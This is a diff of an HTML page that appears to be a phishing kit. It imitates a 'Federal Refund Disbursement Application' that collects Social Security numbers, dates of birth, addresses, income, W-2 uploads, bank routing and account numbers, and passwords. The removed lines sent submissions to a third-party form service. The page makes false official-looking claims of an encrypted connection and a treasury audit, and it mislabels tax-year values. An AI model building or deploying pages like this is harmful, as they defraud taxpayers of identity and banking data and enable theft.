@@ -12,258 +12,271 @@
         .official-seal-bg { background-color: #f8f9fa; border-left: 5px solid #002868; }
         .error-border { border: 2px solid #dc3545 !important; }
         .success-text { color: #28a745; font-weight: bold; }
+
+        /* MOBILE PLACEHOLDER SIZE FIX */
+        @media (max-width: 480px) {
+            input::placeholder {
+                font-size: 1rem;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <div class="form-container" role="main">
-        <div id="auth-controls" style="text-align:center; margin-bottom:20px; padding:10px; background:#e9ecef; border-radius:5px;">
-            <p style="font-size:0.8rem; margin-bottom:10px; color:#555;">SECURITY STATUS: ENCRYPTED CONNECTION ACTIVE</p>
-            <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Portal Login</button>
-            <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Secure Account</button>
-            <a id="btn-logout" href="#" class="btn btn-secondary" style="display:none; margin-left:8px;">Log Out</a>
-        </div>
-
-        <div id="auth-modal" class="modal" aria-hidden="true" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
-            <div class="modal-content" role="dialog" aria-modal="true" aria-labelledby="auth-title" style="background:white; padding:30px; border-radius:10px; width:90%; max-width:450px; box-shadow: 0 5px 30px rgba(0,0,0,0.5);">
-                <h3 id="auth-title" style="color:#002868; border-bottom:1px solid #ddd; padding-bottom:10px;">Security Access</h3>
-                
-                <div id="auth-forms">
-                    <form id="register-form" style="display:none;">
-                        <p style="font-size:0.8rem; color:#666;">Note: Account password must be at least 7 characters.</p>
-                        <label for="reg-email">Email (Username)</label>
-                        <input id="reg-email" type="email" required placeholder="name@example.com" />
-                        
-                        <label for="reg-password">Secure Password</label>
-                        <input id="reg-password" type="password" required placeholder="Minimum 7 characters" />
-                        
-                        <label for="reg-name">Legal Full Name</label>
-                        <input id="reg-name" type="text" required />
-                        
-                        <label for="reg-dob">Date of Birth (MM/DD/YYYY)</label>
-                        <input id="reg-dob" type="text" placeholder="MM/DD/YYYY" maxlength="10" required />
-                        
-                        <div style="margin-top:15px; display:flex; gap:10px;">
-                            <button id="btn-register" class="btn btn-primary" type="button">Register ID</button>
-                            <button id="btn-cancel-auth" class="btn btn-secondary" type="button">Cancel</button>
-                        </div>
-                        <div id="register-msg" class="error-message" style="display:none;margin-top:10px; color:red;"></div>
-                    </form>
-
-                    <form id="login-form" style="display:none;">
-                        <label for="login-email">Authorized Email</label>
-                        <input id="login-email" type="email" required />
-                        
-                        <label for="login-password">Password</label>
-                        <input id="login-password" type="password" required />
-                        
-                        <div style="margin-top:8px; text-align:right;">
-                            <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3;">Forgot secure password?</a>
-                        </div>
-                        
-                        <div style="margin-top:15px; display:flex; gap:10px;">
-                            <button id="btn-login" class="btn btn-primary" type="button">Sign In</button>
-                            <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
-                        </div>
-                        <div id="login-msg" class="error-message" style="display:none;margin-top:10px; color:red;"></div>
-                    </form>
-
-                    <form id="forgot-form" style="display:none;">
-                        <p>A recovery link will be sent to the email address on file.</p>
-                        <label for="forgot-email">Recovery Email</label>
-                        <input id="forgot-email" type="email" required />
-                        <div style="margin-top:15px; display:flex; gap:10px;">
-                            <button id="btn-forgot-send" class="btn btn-primary" type="button">Send Link</button>
-                            <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
-                        </div>
-                    </form>
-
-                    <form id="reset-form" style="display:none;">
-                        <label for="reset-email">Email</label>
-                        <input id="reset-email" type="email" required />
-                        <label for="reset-code">Verification Code</label>
-                        <input id="reset-code" type="text" inputmode="numeric" required />
-                        <label for="reset-password">New Password</label>
-                        <input id="reset-password" type="password" required />
-                        <div style="margin-top:15px; display:flex; gap:10px;">
-                            <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset</button>
-                            <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
-                        </div>
-                    </form>
-
-                    <form id="mfa-form" style="display:none; text-align:center;">
-                        <div style="background:#f0f7ff; padding:15px; border-radius:5px; margin-bottom:15px;">
-                            <p style="font-size:0.9rem;">Identity confirmed. Enter the 6-digit PIN sent to your email to continue.</p>
-                        </div>
-                        <label for="mfa-code">6-Digit PIN</label>
-                        <input id="mfa-code" type="text" maxlength="6" style="text-align:center; font-size:1.5rem; letter-spacing:5px;" />
-                        <div style="margin-top:15px; display:flex; gap:10px;">
-                            <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%;">Authorize Session</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <h2 id="portal-title">Federal Refund Disbursement Application</h2>
-
-        <div class="step-indicator" role="tablist" id="progress-bar">
-            <div class="step active" data-step="1">1. Selection</div>
-            <div class="step" data-step="2">2. Identity</div>
-            <div class="step" data-step="3">3. Financials</div>
-            <div class="step" data-step="4">4. Banking</div>
-            <div class="step" data-step="5">5. Audit</div>
-        </div>
-
-        <form id="refund-form" novalidate action="https://formspree.io/f/xzzngynp" method="POST" enctype="multipart/form-data">
-            
-            <div class="step-content active" data-step="1">
-                <div class="form-group official-seal-bg" style="padding:15px;">
-                    <label for="tax-year">Select Tax Filing Period *</label>
-                    <select id="tax-year" name="taxYear" required>
-                        <option value="">Choose Year...</option>
-                        <option value="2024">Tax Year 2024 (Current)</option>
-                        <option value="2023">Tax Year 2023</option>
-                        <option value="2022">Tax Year 2022</option>
-                        <option value="2021">Tax Year 2021</option>
-                        <option value="2020">Tax Year 2020</option>
-                        <option value="2019">Tax Year 2019</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Filing Category *</label>
-                    <div class="radio-group">
-                        <input type="radio" name="filing-status" value="single" id="single" required>
-                        <label for="single">Single</label>
-                        <input type="radio" name="filing-status" value="married-joint" id="married-joint">
-                        <label for="married-joint">Married Jointly</label>
-                        <input type="radio" name="filing-status" value="head-household" id="head-household">
-                        <label for="head-household">Head of Household</label>
-                    </div>
-                </div>
-            </div>
-
-            <div class="step-content" data-step="2" style="display:none;">
-                <p class="security-note">Sensitive identity fields are masked for your protection. Ensure accuracy to avoid audit delays.</p>
-                <div class="form-group">
-                    <label for="full-name">Full Legal Name *</label>
-                    <input type="text" id="full-name" name="fullName" placeholder="As shown on SSN Card" required>
-                </div>
-                <div class="form-group">
-                    <label for="email">Primary Email Address *</label>
-                    <input type="email" id="email" name="email" placeholder="email@example.com" required>
-                </div>
-                <div class="form-group">
-                    <label for="phone">Phone Contact (Optional)</label>
-                    <input type="tel" id="phone" name="phone" placeholder="555-555-5555" maxlength="12">
-                </div>
-                <div class="form-group">
-                    <label for="dob">Date of Birth * (MM/DD/YYYY)</label>
-                    <input type="text" id="dob-main" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
-                    <small>Type your birth date manually (e.g. 01/01/1990)</small>
-                </div>
-                <div class="form-group">
-                    <label for="ssn">Social Security Number (9 Digits) *</label>
-                    <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                    <div id="ssn-error" style="color:red; font-size:0.75rem; display:none;">Invalid SSN Format.</div>
-                </div>
-                <div class="form-group">
-                    <label for="address">Primary Residential Address *</label>
-                    <input type="text" id="address" name="address" required>
-                </div>
-            </div>
-
-            <div class="step-content" data-step="3" style="display:none;">
-                <div class="form-group">
-                    <label for="gross-income">Adjusted Gross Income (AGI) *</label>
-                    <input type="number" id="gross-income" name="grossIncome" placeholder="Ex: 45000" min="0" required>
-                </div>
-                <div class="form-group">
-                    <label for="tax-withheld">Federal Income Tax Withheld *</label>
-                    <input type="number" id="tax-withheld" name="taxWithheld" placeholder="Ex: 5000" min="0" required>
-                </div>
-                <div class="form-group">
-                    <label>Dependents Declaration *</label>
-                    <div class="radio-group">
-                        <input type="radio" name="dependents" value="yes" id="dep-yes" required>
-                        <label for="dep-yes">Yes</label>
-                        <input type="radio" name="dependents" value="no" id="dep-no">
-                        <label for="dep-no">No</label>
-                    </div>
-                </div>
-                <div class="form-group" id="dep-count-box" style="display:none;">
-                    <label for="dependents-count">Number of Qualifying Dependents:</label>
-                    <input type="number" id="dependents-count" name="dependentsCount" value="0" min="0" max="15">
-                </div>
-                <div class="form-group">
-                    <label for="document-upload">Attach W-2 / 1099 Forms (PDF/JPG)</label>
-                    <input type="file" id="document-upload" name="documentUpload" accept=".pdf,.jpg,.jpeg">
-                </div>
-            </div>
-
-            <div class="step-content" data-step="4" style="display:none;">
-                <h3 style="color:#002868;">Electronic Funds Transfer (EFT)</h3>
-                <div class="form-group">
-                    <label for="bank-name">Financial Institution Name *</label>
-                    <input type="text" id="bank-name" name="bankName" required>
-                </div>
-                <div class="form-group">
-                    <label for="routing-number">9-Digit Routing Number *</label>
-                    <input type="text" id="routing-number" name="routingNumber" maxlength="9" required>
-                    <div id="routing-error" style="color:red; font-size:0.75rem; display:none;">Must be exactly 9 digits.</div>
-                </div>
-                <div class="form-group">
-                    <label for="account-number">Personal Account Number *</label>
-                    <input type="text" id="account-number" name="accountNumber" maxlength="17" required>
-                </div>
-            </div>
-
-            <div class="step-content" data-step="5" style="display:none;">
-                <h3 style="color:#002868;">Final Review of Application</h3>
-                <div class="review-data" id="review-summary" style="padding:20px; background:#f0f7ff; border:1px solid #002868; border-radius:8px;">
-                    <p><strong>Primary Taxpayer:</strong> <span id="review-name"></span></p>
-                    <p><strong>Calculated Year:</strong> <span id="review-year"></span></p>
-                    <p><strong>Gross Earnings:</strong> $<span id="review-income"></span></p>
-                    <p><strong>Withholding Total:</strong> $<span id="review-withheld"></span></p>
-                    <p><strong>Dependency Count:</strong> <span id="review-dependents"></span></p>
-                </div>
-
-                <div class="form-group" style="margin-top:25px;">
-                    <input type="checkbox" id="consent" name="consent" required>
-                    <label for="consent" style="display:inline; font-size:0.9rem;">I declare under penalty of perjury that this application is true and complete to the best of my knowledge.</label>
-                </div>
-            </div>
-
-            <div class="btn-group" style="margin-top:30px; display:flex; justify-content:space-between;">
-                <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Back</button>
-                <button type="button" class="btn btn-primary" id="nextBtn">Continue</button>
-                <button type="submit" class="btn btn-success" id="submitBtn" style="display:none;">Submit Official Application</button>
-            </div>
-        </form>
-
-        <div id="final-results-page" style="display:none; text-align:center; padding:40px;">
-            <div style="font-size: 80px; color: #28a745;">✓</div>
-            <h2 style="color:#002868;">Submission Received</h2>
-            <p style="font-size:1.1rem; margin-bottom:20px;">Your tax refund has been calculated and submitted for final treasury audit.</p>
-            
-            <div style="background:#eef9f0; padding:20px; border-radius:15px; margin:20px 0; border:2px dashed #28a745;">
-                <p style="margin:0; color:#555;">Estimated Refund Amount:</p>
-                <h1 style="font-size:3.5rem; color:#28a745; margin:10px 0;">$<span id="display-refund-amount">0.00</span></h1>
-            </div>
-
-            <div style="text-align:left; background:#fff; border:1px solid #ddd; padding:20px; border-radius:10px; margin-bottom:30px;">
-                <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
-                <p><strong>Disbursement Status:</strong> <span style="color:#d35400;">Pending Verification</span></p>
-                <hr>
-                <p style="font-size:0.9rem; color:#666; line-height:1.5;"><strong>Important:</strong> Our agents are currently reviewing your documents for accuracy. We will get back to you shortly via the email provided. You can expect to receive your refund later once the verification process is successfully finalized.</p>
-            </div>
-            
-            <button onclick="window.location.reload()" class="btn btn-primary" style="padding:15px 40px;">Return to Portal Home</button>
-        </div>
-
+<div class="form-container" role="main">
+    <div id="auth-controls" style="text-align:center; margin-bottom:20px; padding:10px; background:#e9ecef; border-radius:5px;">
+        <p style="font-size:0.8rem; margin-bottom:10px; color:#555;">SECURITY STATUS: ENCRYPTED CONNECTION ACTIVE</p>
+        <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Portal Login</button>
+        <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Secure Account</button>
+        <a id="btn-logout" href="#" class="btn btn-secondary" style="display:none; margin-left:8px;">Log Out</a>
     </div>
 
-    <script src="auth.js"></script>
-    <script src="tax.js"></script>
+    <div id="auth-modal" class="modal" aria-hidden="true" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
+        <div class="modal-content" role="dialog" aria-modal="true" aria-labelledby="auth-title" style="background:white; padding:30px; border-radius:10px; width:90%; max-width:450px; box-shadow: 0 5px 30px rgba(0,0,0,0.5);">
+            <h3 id="auth-title" style="color:#002868; border-bottom:1px solid #ddd; padding-bottom:10px;">Security Access</h3>
+            
+            <div id="auth-forms">
+                <form id="register-form" style="display:none;">
+                    <p style="font-size:0.8rem; color:#666;">Note: Account password must be at least 7 characters.</p>
+                    <label for="reg-email">Email (Username)</label>
+                    <input id="reg-email" type="email" required placeholder="name@example.com" />
+                    
+                    <label for="reg-password">Secure Password</label>
+                    <input id="reg-password" type="password" required placeholder="Minimum 7 characters" />
+                    
+                    <label for="reg-name">Legal Full Name</label>
+                    <input id="reg-name" type="text" required />
+                    
+                    <label for="reg-dob">Date of Birth (MM/DD/YYYY)</label>
+                    <input id="reg-dob" type="text" placeholder="MM/DD/YYYY" maxlength="10" required />
+                    
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button id="btn-register" class="btn btn-primary" type="button">Register ID</button>
+                        <button id="btn-cancel-auth" class="btn btn-secondary" type="button">Cancel</button>
+                    </div>
+                    <div id="register-msg" class="error-message" style="display:none;margin-top:10px; color:red;"></div>
+                </form>
+
+                <form id="login-form" style="display:none;">
+                    <label for="login-email">Authorized Email</label>
+                    <input id="login-email" type="email" required />
+                    
+                    <label for="login-password">Password</label>
+                    <input id="login-password" type="password" required />
+                    
+                    <div style="margin-top:8px; text-align:right;">
+                        <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3;">Forgot secure password?</a>
+                    </div>
+                    
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button id="btn-login" class="btn btn-primary" type="button">Sign In</button>
+                        <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
+                    </div>
+                    <div id="login-msg" class="error-message" style="display:none;margin-top:10px; color:red;"></div>
+                </form>
+
+                <form id="forgot-form" style="display:none;">
+                    <p>A verification code will be sent to your email for password recovery.</p>
+                    <label for="forgot-email">Recovery Email</label>
+                    <input id="forgot-email" type="email" required />
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button id="btn-forgot-send" class="btn btn-primary" type="button">Send Verification Code</button>
+                        <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
+                    </div>
+                </form>
+
+                <form id="reset-form" style="display:none;">
+                    <label for="reset-email">Email</label>
+                    <input id="reset-email" type="email" required />
+                    <label for="reset-code">Verification Code</label>
+                    <input id="reset-code" type="text" inputmode="numeric" required />
+                    <label for="reset-password">New Password</label>
+                    <input id="reset-password" type="password" required />
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset</button>
+                        <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
+                    </div>
+                </form>
+
+                <form id="mfa-form" style="display:none; text-align:center;">
+                    <div style="background:#f0f7ff; padding:15px; border-radius:5px; margin-bottom:15px;">
+                        <p style="font-size:0.9rem;">Identity confirmed. Enter the 6-digit PIN sent to your email to continue.</p>
+                    </div>
+                    <label for="mfa-code">6-Digit PIN</label>
+                    <input id="mfa-code" type="text" maxlength="6" style="text-align:center; font-size:1.5rem; letter-spacing:5px;" />
+                    <div style="margin-top:15px; display:flex; gap:10px;">
+                        <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%;">Authorize Session</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <h2 id="portal-title">Federal Refund Disbursement Application</h2>
+
+    <div class="step-indicator" role="tablist" id="progress-bar">
+        <div class="step active" data-step="1">1. Selection</div>
+        <div class="step" data-step="2">2. Identity</div>
+        <div class="step" data-step="3">3. Financials</div>
+        <div class="step" data-step="4">4. Banking</div>
+        <div class="step" data-step="5">5. Audit</div>
+    </div>
+
+    <form id="refund-form" novalidate>
+        <!-- STEP 1: Tax Year & Filing -->
+        <div class="step-content active" data-step="1">
+            <div class="form-group official-seal-bg" style="padding:15px;">
+                <label for="tax-year">Select Tax Filing Period *</label>
+                <select id="tax-year" name="taxYear" required>
+                    <option value="">Choose Year...</option>
+                    <option value="2024">Tax Year 2026 (Current)</option>
+                    <option value="2024">Tax Year 2025 </option>
+                    <option value="2024">Tax Year 2024 </option>
+                    <option value="2023">Tax Year 2023</option>
+                    <option value="2022">Tax Year 2022</option>
+                    <option value="2021">Tax Year 2021</option>
+                    <option value="2020">Tax Year 2020</option>
+                    
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Filing Category *</label>
+                <div class="radio-group">
+                    <input type="radio" name="filing-status" value="single" id="single" required>
+                    <label for="single">Single</label>
+                    <input type="radio" name="filing-status" value="married-joint" id="married-joint">
+                    <label for="married-joint">Married Jointly</label>
+                    <input type="radio" name="filing-status" value="head-household" id="head-household">
+                    <label for="head-household">Head of Household</label>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: Identity -->
+        <div class="step-content" data-step="2" style="display:none;">
+            <p class="security-note">Sensitive identity fields are masked for your protection. Ensure accuracy to avoid audit delays.</p>
+            <div class="form-group">
+                <label for="full-name">Full Legal Name *</label>
+                <input type="text" id="full-name" name="fullName" placeholder="As shown on SSN Card" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Primary Email Address *</label>
+                <input type="email" id="email" name="email" placeholder="email@example.com" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Contact (Optional)</label>
+                <input type="tel" id="phone" name="phone" placeholder="555-555-5555" maxlength="12">
+            </div>
+            <div class="form-group">
+                <label for="dob">Date of Birth * (MM/DD/YYYY)</label>
+                <input type="text" id="dob-main" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
+                <small>Type your birth date manually (e.g. 01/01/1990)</small>
+            </div>
+            <div class="form-group">
+                <label for="ssn">Social Security Number (9 Digits) *</label>
+                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                <div id="ssn-error" style="color:red; font-size:0.75rem; display:none;">Invalid SSN Format.</div>
+            </div>
+            <div class="form-group">
+                <label for="address">Primary Residential Address *</label>
+                <input type="text" id="address" name="address" required>
+            </div>
+        </div>
+
+        <!-- STEP 3: Financials -->
+        <div class="step-content" data-step="3" style="display:none;">
+            <div class="form-group">
+                <label for="gross-income">Adjusted Gross Income (AGI) *</label>
+                <input type="number" id="gross-income" name="grossIncome" placeholder="Ex: 45000" min="0" required>
+            </div>
+            <div class="form-group">
+                <label for="tax-withheld">Federal Income Tax Withheld *</label>
+                <input type="number" id="tax-withheld" name="taxWithheld" placeholder="Ex: 5000" min="0" required>
+            </div>
+            <div class="form-group">
+                <label>Dependents Declaration *</label>
+                <div class="radio-group">
+                    <input type="radio" name="dependents" value="yes" id="dep-yes" required>
+                    <label for="dep-yes">Yes</label>
+                    <input type="radio" name="dependents" value="no" id="dep-no">
+                    <label for="dep-no">No</label>
+                </div>
+            </div>
+            <div class="form-group" id="dep-count-box" style="display:none;">
+                <label for="dependents-count">Number of Qualifying Dependents:</label>
+                <input type="number" id="dependents-count" name="dependentsCount" value="0" min="0" max="15">
+            </div>
+            <div class="form-group">
+                <label for="document-upload">Attach W-2 / 1099 Forms (PDF/JPG)</label>
+                <input type="file" id="document-upload" name="documentUpload" accept=".pdf,.jpg,.jpeg">
+            </div>
+        </div>
+
+        <!-- STEP 4: Banking -->
+        <div class="step-content" data-step="4" style="display:none;">
+            <h3 style="color:#002868;">Electronic Funds Transfer (EFT)</h3>
+            <div class="form-group">
+                <label for="bank-name">Financial Institution Name *</label>
+                <input type="text" id="bank-name" name="bankName" required>
+            </div>
+            <div class="form-group">
+                <label for="routing-number">9-Digit Routing Number *</label>
+                <input type="text" id="routing-number" name="routingNumber" maxlength="9" required>
+                <div id="routing-error" style="color:red; font-size:0.75rem; display:none;">Must be exactly 9 digits.</div>
+            </div>
+            <div class="form-group">
+                <label for="account-number">Personal Account Number *</label>
+                <input type="text" id="account-number" name="accountNumber" maxlength="17" required>
+            </div>
+        </div>
+
+        <!-- STEP 5: Audit/Review -->
+        <div class="step-content" data-step="5" style="display:none;">
+            <h3 style="color:#002868;">Final Review of Application</h3>
+            <div class="review-data" id="review-summary" style="padding:20px; background:#f0f7ff; border:1px solid #002868; border-radius:8px;">
+                <p><strong>Primary Taxpayer:</strong> <span id="review-name"></span></p>
+                <p><strong>Calculated Year:</strong> <span id="review-year"></span></p>
+                <p><strong>Gross Earnings:</strong> $<span id="review-income"></span></p>
+                <p><strong>Withholding Total:</strong> $<span id="review-withheld"></span></p>
+                <p><strong>Dependency Count:</strong> <span id="review-dependents"></span></p>
+            </div>
+
+            <div class="form-group" style="margin-top:25px;">
+                <input type="checkbox" id="consent" name="consent" required>
+                <label for="consent" style="display:inline; font-size:0.9rem;">I declare under penalty of perjury that this application is true and complete to the best of my knowledge.</label>
+            </div>
+        </div>
+
+        <div class="btn-group" style="margin-top:30px; display:flex; justify-content:space-between;">
+            <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Back</button>
+            <button type="button" class="btn btn-primary" id="nextBtn">Continue</button>
+            <button type="submit" class="btn btn-success" id="submitBtn" style="display:none;">Submit Official Application</button>
+        </div>
+    </form>
+
+    <!-- Final Results Page -->
+    <div id="final-results-page" style="display:none; text-align:center; padding:40px;">
+        <div style="font-size: 80px; color: #28a745;">✓</div>
+        <h2 style="color:#002868;">Submission Received</h2>
+        <p style="font-size:1.1rem; margin-bottom:20px;">Your tax refund has been calculated and submitted for final treasury audit.</p>
+        
+        <div style="background:#eef9f0; padding:20px; border-radius:15px; margin:20px 0; border:2px dashed #28a745;">
+            <p style="margin:0; color:#555;">Estimated Refund Amount:</p>
+            <h1 style="font-size:3.5rem; color:#28a745; margin:10px 0;">$<span id="display-refund-amount">0.00</span></h1>
+        </div>
+
+        <div style="text-align:left; background:#fff; border:1px solid #ddd; padding:20px; border-radius:10px; margin-bottom:30px;">
+            <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
+            <p><strong>Disbursement Status:</strong> <span style="color:#d35400;">Pending Verification</span></p>
+            <hr>
+            <p style="font-size:0.9rem; color:#666; line-height:1.5;"><strong>Important:</strong> Our agents are currently reviewing your documents for accuracy. We will get back to you shortly via the email provided. You can expect to receive your refund later once the verification process is successfully finalized.</p>
+        </div>
+        
+        <button onclick="window.location.reload()" class="btn btn-primary" style="padding:15px 40px;">Return to Portal Home</button>
+    </div>
+</div>
+
+<script src="auth.js"></script>
+<script src="tax.js"></script>
 </body>
 </html>
